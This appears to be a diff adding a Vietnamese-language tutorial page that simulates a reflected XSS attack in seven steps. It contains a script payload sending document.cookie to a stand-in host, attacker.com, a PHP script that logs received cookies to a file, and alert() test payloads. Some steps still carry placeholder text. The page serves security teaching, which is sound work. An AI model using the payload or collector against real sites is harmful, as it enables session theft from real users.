@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+  <title>OSWAP Framework</title>
+
+  <!-- Bootstrap -->
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+  <div id='header'>
+    <nav class="navbar navbar-default navbar-fixed-top" role="navigation">
+      <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="index.html">OSWAP
+          </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse navbar-ex1-collapse">
+          <ul class="nav navbar-nav navbar-right">
+            <li><a href="index.html">Instruction</a></li>
+            <li class="active"><a href="get_started.html">Get Started</a></li>
+            <li><a href="about.html">About Us</a></li>
+          </ul>
+
+        </div><!-- /.navbar-collapse -->
+      </div>
+    </nav>
+  </div>
+  <div id="content">
+    <div class="DOM_XSS">
+      <div class="container-fluid">
+        <div class="row">
+          <div class="instruction">
+            <h1 id="inst" >Reflected XSS</h1>
+            <h1 id="inst1" style="display: none;">Mô hình tấn công gồm 7 bước</h1>
+            <div id="inst1_1" style="display: none;">
+              <p>Gồm 3 thành phần chính:<br>
+                <strong>Attacker xây dựng một Web Server</strong><br>
+                <strong>Một Web Server chứa lỗ hổng</strong><br>
+                <strong>User sử dụng Web Server lỗ hổng</strong>
+              </p>
+              <img src="image/Model_attack_Releceted xss.jpg" class="img-thumbnail">
+              <button class="next">Next</button>
+            </div>
+            <h1 id="inst2" style="display: none;">Phân tích lỗ hổng</h1>
+            <h1 id="inst3" style="display: none;">Biện pháp ngăn chặn</h1>
+          </div>
+          <div class="action" style="display: none;">
+            <div class="col-sm-4">
+              <div class="tutorial">
+                <div class="step one">
+                  <h3>Bước 1</h3>
+                  <p>Phía<strong> User</strong> truy cập vào <em>Web Server chứa lỗ hổng</em> và đăng nhập với
+                    <br><strong>Username: user1</strong><br>
+                    <strong>Password: password</strong>
+                  </p>
+                </div>
+                <div class="step two">
+                  <h3>Bước 2</h3>
+                  <p>Phía<strong> Attacker</strong> triển khai một <em>Web Server</em> <strong>Attacker.com</strong> với chức năng là lấy
+                    lấy <em>Cookie</em> của <em>User</em><br>
+                    Sau đó gửi <em>User</em> một đường <em>link</em> dẫn đến <em>Web lỗ hổng</em> mà <em>User</em> đã đăng nhập
+                  </p>
+                </div>
+                <div class="step three">
+                  <h3>Bước 3</h3>
+                  <p>Phía<strong> User</strong> truy cập vào link mà <strong>Attacker</strong> đã gửi:
+                    <br><strong>social.com?search=&lt;script&gt;new
+                      image().src=”attacker.com?cookie=”+document.cookie;&lt;/script&gt;</strong><br></p>
+                </div>
+                <div class="step four">
+                  <h3>Bước 4</h3>
+                  <p>Phía<strong> Web Server chứ lỗ hổng</strong> phản hồi cho <em>User</em>  <strong>Script</strong> của Attacker</p>
+                </div>
+                <div class="step five">
+                  <h3>Bước 5</h3>
+                  <p>Phía<strong> User</strong> <em>script</em> mở ra tab browser mới truy cập vào <em>Web Server</em> của <strong>Attacker</strong></p>
+                </div>
+                <div class="step six">
+                  <h3>Bước 6</h3>
+                  <p>Phía<strong> User</strong> browser gửi <em>Cookie</em> vào <em>Web Sever của Attacker</em></p>
+                </div>
+                <div class="step seven">
+                  <h3>Bước 7</h3>
+                  <p>Phía<strong> Attacker</strong> lấy <em>Cookie</em> của <em>User</em> đưa vào file <em>cookie.txt</em></p>
+                </div>
+              </div>
+               <ul class="nav nav-pills">
+                <li><button class="back">Back</button></li>
+                <li><button class="next">Next</button></li>
+              </ul>
+            </div>
+            <div class="col-sm-8">
+              <div class="interactive">
+                <div class="step one">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <div class="url">
+                        <input class="address" value="social.com">
+                        <div class="load-icon"></div>
+                      </div>
+                    </div>
+                    <div class="frame">
+                      <div class="form">
+                        <h3>Login</h3>
+                        <div class="input-group">
+                          <input type="text" class="form-control" id="username" placeholder="Please enter Username">
+                        </div><br>
+                        <div class="input-group">
+                          <input type="password" class="form-control" id="password" placeholder="Please enter Password">
+                        </div><br>
+                        <button type="submit" id="login" class="btn btn-primary">Login</button>
+
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="step two">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <p>index.php</p>
+                    </div>
+                    
+                    <div class="frame">
+                      <textarea name="codereview" id="codereview" class="domain form-control">&lt;?php
+if(isset($_GET["cookie"])){
+    $cookie=$_GET["cookie"]; //Lấy property Cookie bằng method GET
+    $f=fopen("coookie.txt","a"); //Mở file cookie.txt
+    fwrite($f, "Cookie: ".$cookie); //Ghi cookie vào file txt
+    fclose($f) // Đóng file
+}
+?&gt;</textarea>
+                    </div>
+                  </div>
+                </div>
+                <div class="step three">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <div class="url">
+                        <input class="address" value="social.com">
+                        <div class="load-icon"></div>
+                      </div>
+                    </div>
+                    <div class="frame">
+                      <div class="form">
+                        <h3>Seach Tool</h3><br>
+                        <div class="input-group">
+                          <input type="text" name="domain" class="domain form-control">
+                          <span class="input-group-addon">
+                            <i class="fa fa-search"></i>
+                          </span>
+                      </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="step four five six">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <div class="url">
+                        <input class="address" value="">
+                        <div class="load-icon"></div>
+                      </div>
+                    </div>
+                    <div class="frame">
+                      <div class="form">
+                        <div class="input-group">
+                      </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="step seven">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <p>cookie.txt</p>
+                    </div>
+                    <div class="frame">
+                      <textarea name="cookie" id="cookie" class="domain form-control"></textarea>
+                    </div>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+          </div>
+          <div class="vulnerability" style="display: none;">
+            <div class="col-sm-4">
+              <div class="tutorial">
+                <div class="step one">
+                  <h3>Bước 1</h3>
+                  <p>Nhập bất kỳ kí tự vào thanh tìm kiếm. Kí tự nhập vào sẽ hiển thị trên thanh Url</p>
+                </div>
+                <div class="step two">
+                  <h3>Bước 2</h3>
+                  <p>Nhập tuần tự các đoạn mã Script sau:
+                    <strong>&lt;script&gt;alert("hello")&lt;/script&gt;</strong>
+                    <strong>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</strong><br>
+                    Đoạn Script thứ nhất sẽ hiển thị 1 khung Pop up với "hello" <br>
+                    Đoạn Script thứ hai sẽ hiển thị 1 khung Pop up với "Cookie máy của bạn"
+                  </p>
+                </div>
+                <div class="step three">
+                  <h3>Mô phỏng tấn công Lorem ipsum dolor sit amet, consectetur adipis</h3>
+                </div>
+                <div class="step four">
+                  <h3>Mô phỏng tấn công Lorem ipsum dolor sit amet, consectetur adipis</h3>
+                </div>
+                <div class="step five">
+                  <h3>Mô phỏng tấn công Lorem ipsum dolor sit amet, consectetur adipis</h3>
+                </div>
+              </div>
+            </div>
+            <div class="col-sm-8">
+              <div class="interactive">
+                <div class="step one two">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <div class="url">
+                        <input class="address" value="search-o-bot.com">
+                        <div class="load-icon"></div>
+                      </div>
+                    </div>
+                    <div class="step one">
+                      <div class="frame">
+                        <div class="form">
+                          <div class="input-group">
+                            <input type="text" name="domain" class="domain form-control">
+                            <span class="input-group-addon">
+                              <i class="fa fa-search"></i>
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="step three">
+                  <div class="browser">
+                    <div class="nav">
+                      <span class="buttons">
+                        <span class="button red"> </span>
+                        <span class="button orange"> </span>
+                        <span class="button green"> </span>
+                      </span>
+                      <div class="url">
+                        <input class="address" value="search-o-bot.com">
+                        <div class="load-icon"></div>
+                      </div>
+                    </div>
+                    <div class="step one">
+                      <div class="frame">
+                        <div class="form">
+                          <div class="input-group">
+                            <input type="text" name="domain" class="domain form-control">
+                            <span class="input-group-addon">
+                              <i class="fa fa-search"></i>
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="prevent"></div>
+        </div>
+      </div>
+    </div>
+    <div id="footer">
+      <div class="container-fluid">
+        <div class="row">
+          <ul class="list-inline">
+            <li><a>Instruction</a></li>
+            <li><a>Get Started</a></li>
+            <li><a>About Us</a></li>
+          </ul>
+          <p class="text-muted">Copyright <span class="glyphicon glyphicon-copyright-mark"></span> 2020, OSWAP</p>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></scripT>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/main.js"></script>
+</body>
+
+</html>
